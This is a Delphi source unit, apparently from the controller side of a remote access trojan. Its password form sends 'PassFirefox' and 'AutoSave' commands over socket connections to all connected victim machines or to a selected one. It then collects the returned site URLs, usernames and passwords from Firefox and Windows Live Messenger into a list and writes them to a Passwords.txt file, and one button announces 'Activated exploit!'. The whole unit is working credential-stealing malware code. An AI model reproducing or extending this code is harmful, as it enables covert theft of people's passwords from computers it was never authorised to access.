unit uPasswords;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, Buttons, PngBitBtn;

type
  TFrmPasswords = class(TForm)
    PageControl1: TPageControl;
    GroupBox1: TGroupBox;
    GroupBox2: TGroupBox;
    btnPasswords: TPngBitBtn;
    ListPasswords: TListView;
    btnClear: TPngBitBtn;
    btnAutoSave: TPngBitBtn;
    btnOnlyPass: TPngBitBtn;
    btnSave: TPngBitBtn;
    procedure btnPasswordsClick(Sender: TObject);
    procedure btnClearClick(Sender: TObject);
    procedure btnAutoSaveClick(Sender: TObject);
    procedure btnOnlyPassClick(Sender: TObject);
    procedure btnSaveClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FrmPasswords: TFrmPasswords;

procedure AddPass(Data :Array of String);

implementation

uses uGeneral;

{$R *.dfm}

procedure TFrmPasswords.btnPasswordsClick(Sender: TObject);
var
  i :Integer;
begin
  for i := 0 to (FrmGeneral.ListUsers.Items.Count-1) do
  begin
    FrmGeneral.Server.Socket.Connections[i].SendText('PassFirefox');
  end;
end;

procedure AddPass(Data :Array of String);
var
  i           :Integer;
  indexItem   :Integer;
begin
  for i:=1 to 1024 do
  begin
    if not (trim(Data[i]) = '') then
    begin
      if (Copy(Data[i], 1, 4) = 'http') or (Data[i] = 'Windows Live Messenger') then
      begin
        FrmPasswords.ListPasswords.Items.Add;
        indexItem := FrmPasswords.ListPasswords.Items.Count-1;
        FrmPasswords.ListPasswords.Items.Item[indexItem].Caption := Data[i];
      end else FrmPasswords.ListPasswords.Items.Item[indexItem].SubItems.Add(Data[i]);
    end else break;
  end;
end;

procedure TFrmPasswords.btnClearClick(Sender: TObject);
begin
  FrmPasswords.ListPasswords.Clear;
end;

procedure TFrmPasswords.btnAutoSaveClick(Sender: TObject);
var
  i :Integer;
begin
  for i := 0 to (FrmGeneral.ListUsers.Items.Count-1) do
  begin
    FrmGeneral.Server.Socket.Connections[i].SendText('AutoSave');
  end;
  MessageBoxA(0, 'Activated exploit!', 'Information', 64);
end;

procedure TFrmPasswords.btnOnlyPassClick(Sender: TObject);
begin
  if (FrmGeneral.ListUsers.Selected <> nil) then
  begin
    FrmGeneral.Server.Socket.Connections[FrmGeneral.ListUsers.Selected.Index].SendText('PassFirefox');
  end else MessageBoxA(0, 'Select a user!', 'Information', 64);
end;

procedure TFrmPasswords.btnSaveClick(Sender: TObject);
var
  i      :Integer;
  Buffer :String;
  F      :TextFile;
begin
  Buffer := '';
  for i := 0 to (FrmPasswords.ListPasswords.Items.Count-1) do
  begin
    if (FrmPasswords.ListPasswords.Items[i].SubItems.Count = 2) then
    begin
      Buffer := Buffer + FrmPasswords.ListPasswords.Items[i].Caption +' - ';
      Buffer := Buffer + FrmPasswords.ListPasswords.Items[i].SubItems.Strings[0] +' - '+
      FrmPasswords.ListPasswords.Items[i].SubItems.Strings[1] +#13#10;
    end;
  end;

  AssignFile(F, ExtractFilePath(ParamStr(0))+'Passwords.txt');
  Rewrite(F);
  Writeln(F, Buffer);
  CloseFile(F);
  MessageBox(0, 'Saved in Password.txt!', 'Information', 64);
end;

end.
